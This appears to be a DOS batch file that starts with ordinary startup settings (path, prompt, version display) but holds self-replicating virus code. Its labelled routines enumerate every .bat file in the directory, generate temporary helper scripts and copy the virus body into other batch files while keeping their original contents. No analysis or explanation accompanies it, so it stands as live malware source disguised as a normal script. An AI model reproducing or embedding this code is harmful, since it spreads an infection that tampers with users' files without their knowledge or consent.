@echo off
goto vr_s
:body_s
@echo off
path c:\;c:\dos;c:\windows
prompt $p$g
ver
goto vr_e
@echo off
goto vr_s
:body_s
goto vr_e
:vr_s
if "%2"=="@v" goto vr_2
set tf=%0
set cf=@
if exist %0 goto vr_1
set tf=%0.BAT
:vr_1
echo if %%1==%%tf%% goto ve_1>@v.bat
echo if %%1==@V.BAT goto ve_1>>@v.bat
echo call %%tf%% %%1 @v>>@v.bat
echo :ve_1>>@v.bat
for %%v in (*.bat) do call @v %%v
del @v.bat>nul
if not exist %cf% goto body_s
echo @echo off>@v
echo goto vr_s>>@v
echo :body_s>>@v
type %cf%>>@v
echo goto vr_e>>@v
type %tf%>>@v
del %cf%>nul
copy @v %cf%>nul
del @v>nul
goto body_s
:vr_3
set cf=@
goto vr_4
:vr_2
echo goto vr_3>@@v.bat
type %1>>@@v.bat
echo :vr_3>>@@v.bat
echo :vr_4>>@@v.bat
set cf=%1
call @@v
del @@v.bat
:vr_e
